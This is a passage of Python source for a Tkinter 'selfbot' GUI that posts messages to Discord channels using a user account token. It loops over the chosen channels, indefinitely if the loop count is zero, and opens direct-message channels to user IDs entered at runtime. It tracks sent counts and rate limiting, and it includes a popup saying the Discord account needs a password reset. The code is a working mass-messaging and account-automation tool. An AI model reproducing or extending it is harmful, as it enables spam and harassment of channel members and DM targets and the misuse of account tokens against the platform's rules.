        if self.stats_frame and self.stats_frame.winfo_exists():
            self.stats_frame.destroy()
        self.stats_frame = tk.Frame(pad, bg="#21222c", bd=0, relief="flat")
        self.stats_frame.pack(pady=(10, 0))
        # Calculate usage duration
        elapsed = int(time.time() - self.start_time)
        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60
        duration = f"{hours}h {minutes}m {seconds}s"
        tk.Label(self.stats_frame, text="Statistics", bg="#21222c", fg="#bd93f9", font=("Segoe UI", 14, "bold")).pack(pady=(8, 4))
        tk.Label(self.stats_frame, text=f"Total Startups: {self.total_startups}", bg="#21222c", fg="#fff", font=("Segoe UI", 12)).pack(anchor="w", padx=12)
        tk.Label(self.stats_frame, text=f"Messages Sent: {self.message_counter.get()}", bg="#21222c", fg="#fff", font=("Segoe UI", 12)).pack(anchor="w", padx=12)
        tk.Label(self.stats_frame, text=f"Usage Duration: {duration}", bg="#21222c", fg="#fff", font=("Segoe UI", 12)).pack(anchor="w", padx=12)

    def toggle_fullscreen(self, event=None):
        self.is_fullscreen = not self.is_fullscreen
        self.root.attributes("-fullscreen", self.is_fullscreen)

    def exit_fullscreen(self, event=None):
        self.is_fullscreen = False
        self.root.attributes("-fullscreen", False)

    def start_sending(self):
        # Get message, token, channels, loop count, and delay
        message = self.message_text_entry.get("1.0", tk.END).strip()
        token_name = self.token_var.get()
        token = self.tokens.get(token_name)
        selected_indices = self.channel_listbox.curselection() if hasattr(self, 'channel_listbox') else []
        channels = [self.channel_listbox.get(i) for i in selected_indices] if selected_indices else self.saved_channel_ids[:]
        loop_count = self.loop_count.get()
        delay = self.message_send_delay.get() if hasattr(self, 'message_send_delay') else 0
        channel_switch_delay = self.channel_switch_delay.get() if hasattr(self, 'channel_switch_delay') else 0
        message_send_delay = self.message_send_delay.get() if hasattr(self, 'message_send_delay') else 0
        if loop_count == 0:
            loop_count = float('inf')
        if not message:
            messagebox.showerror("Error", "Message cannot be empty.")
            return
        if not token:
            messagebox.showerror("Error", "No token selected.")
            return
        if not channels:
            messagebox.showerror("Error", "No channels selected.")
            return
        # Reset pause/stop flags before starting
        self.sending_paused = False
        self.sending_stopped = False
        self.log(f"Starting message sending: {loop_count} loops, {delay}s delay, {len(channels)} channels.")
        threading.Thread(target=self.send_messages_thread, args=(message, token, channels, loop_count, delay, channel_switch_delay, message_send_delay), daemon=True).start()

    def send_messages_thread(self, message, token, channels, loop_count, delay, channel_switch_delay, message_send_delay):
        headers = {"Authorization": token, "Content-Type": "application/json"}
        loop = 0
        while loop < loop_count:
            for channel_id in channels:
                try:
                    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
                    data = {"content": message}
                    response = requests.post(url, headers=headers, json=data)
                    if response.status_code == 200 or response.status_code == 201:
                        self.message_counter.set(self.message_counter.get() + 1)
                        self.save_json(self.MESSAGE_COUNT_FILE, self.message_counter.get())
                        self.log(f"[Loop {loop+1}] Sent message to channel {channel_id}. Total sent: {self.message_counter.get()}")
                        if hasattr(self, 'token_status_label'):
                            self.token_status_label.config(text="Not Limited", fg="#50fa7b")
                    else:
                        self.log(f"[Loop {loop+1}] Failed to send to {channel_id}: {response.status_code} {response.text}")
                except Exception as e:
                    self.log(f"[Loop {loop+1}] Error sending to {channel_id}: {e}")
                if channel_switch_delay > 0 and channel_id != channels[-1]:
                    time.sleep(channel_switch_delay)
                if message_send_delay > 0:
                    time.sleep(message_send_delay)
                while self.sending_paused:
                    time.sleep(0.1)
                if self.sending_stopped:
                    self.log("Sending stopped by user.")
                    return
            loop += 1
            if loop < loop_count:
                time.sleep(delay)
        self.log("Message sending complete.")

    def pause_sending(self):
        self.sending_paused = not self.sending_paused
        self.log("Sending paused." if self.sending_paused else "Sending resumed.")

    def stop_sending(self):
        self.sending_stopped = True
        self.log("Sending stopped.")

    def export_logs(self):
        # Placeholder for export logs logic
        print("Export Logs button clicked.")
        messagebox.showinfo("Info", "Export Logs feature is not implemented yet.")

    def load_community_chat(self):
        # Placeholder for loading community chat logic
        print("Load Community Chat button clicked.")
        messagebox.showinfo("Info", "Load Community Chat feature is not implemented yet.")

    def start_reply_dm(self):
        token_name = self.token_var.get()
        token = self.tokens.get(token_name)
        if not token:
            messagebox.showerror("Error", "No token selected.")
            return
        user_id = simpledialog.askstring("User ID", "Enter the user ID to DM:")
        if not user_id:
            return
        message = self.dm_reply_text.get()
        delay = self.reply_dm_delay.get()
        threading.Thread(target=self.send_reply_dm_thread, args=(token, user_id, message, delay), daemon=True).start()

    def send_reply_dm_thread(self, token, user_id, message, delay):
        headers = {"Authorization": token, "Content-Type": "application/json"}
        # Create DM channel
        url = f"https://discord.com/api/v9/users/@me/channels"
        data = {"recipient_id": user_id}
        try:
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200 or response.status_code == 201:
                channel_id = response.json().get("id")
                if channel_id:
                    time.sleep(delay)
                    msg_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
                    msg_data = {"content": message}
                    msg_resp = requests.post(msg_url, headers=headers, json=msg_data)
                    if msg_resp.status_code == 200 or msg_resp.status_code == 201:
                        self.log(f"Sent DM to {user_id}.")
                        # Set status label to 'Not Limited' (green) after successful DM send
                        if hasattr(self, 'token_status_label'):
                            self.token_status_label.config(text="Not Limited", fg="#50fa7b")
                    else:
                        self.log(f"Failed to send DM: {msg_resp.status_code} {msg_resp.text}")
                else:
                    self.log("Failed to get DM channel ID.")
            else:
                self.log(f"Failed to create DM channel: {response.status_code} {response.text}")
        except Exception as e:
            self.log(f"Error sending DM: {e}")

    def add_rotator_message(self):
        msg = self.rotator_entry.get("1.0", tk.END).strip()
        if msg:
            self.rotator_messages.append(msg)
            self.rotator_entry.delete("1.0", tk.END)
            self.log(f"Added message to rotator: {msg}")

    def clear_rotator_messages(self):
        self.rotator_messages.clear()
        self.log("Cleared all rotator messages.")

    def remove_rotator_message(self):
        selected = self.rotator_listbox.curselection()
        if selected:
            index = selected[0]
            message = self.rotator_messages[index]
            del self.rotator_messages[index]
            self.log(f"Removed message from rotator: {message}")

    def log(self, message):
        if hasattr(self, 'log_text') and self.log_text:
            self.log_text.config(state=tk.NORMAL)
            self.log_text.insert(tk.END, f"{message}\n")
            self.log_text.see(tk.END)
            self.log_text.config(state=tk.DISABLED)
        print(message)

    def save_channel_id(self):
        channel_id = self.channel_id_var.get().strip()
        if channel_id and channel_id not in self.saved_channel_ids:
            self.saved_channel_ids.append(channel_id)
            self.channel_listbox.insert(tk.END, channel_id)
            self.log(f"Channel ID saved: {channel_id}")
        self.channel_id_var.set("")

    def remove_selected_channel_id(self):
        selected = list(self.channel_listbox.curselection())
        for idx in reversed(selected):
            channel_id = self.channel_listbox.get(idx)
            self.saved_channel_ids.remove(channel_id)
            self.channel_listbox.delete(idx)
            self.log(f"Channel ID removed: {channel_id}")

    def show_password_reset_popup(self):
        popup = tk.Toplevel(self.root)
        popup.overrideredirect(True)
        popup.geometry(f"300x50+{self.root.winfo_x()+20}+{self.root.winfo_y()+self.root.winfo_height()-80}")
        popup.configure(bg="#282a36")
        label = tk.Label(popup, text="Your Discord account requires a password reset", bg="#282a36", fg="#ff5555", font=self.normal_font)
        label.pack(expand=True, fill="both")
        popup.after(20000, popup.destroy)

    def set_token_limited(self):
        if hasattr(self, 'token_status_label'):
            self.token_status_label.config(text="Limited", fg="#ffb86c")
        self.log("Token is limited: cannot send messages.")

def main():
    try:
        root = tk.Tk()
        app = PyDraculaSelfbot(root)
        root.mainloop()
    except Exception as e:
        import traceback
        print("Error starting GUI:", e)
        traceback.print_exc()

if __name__ == "__main__":
    main()

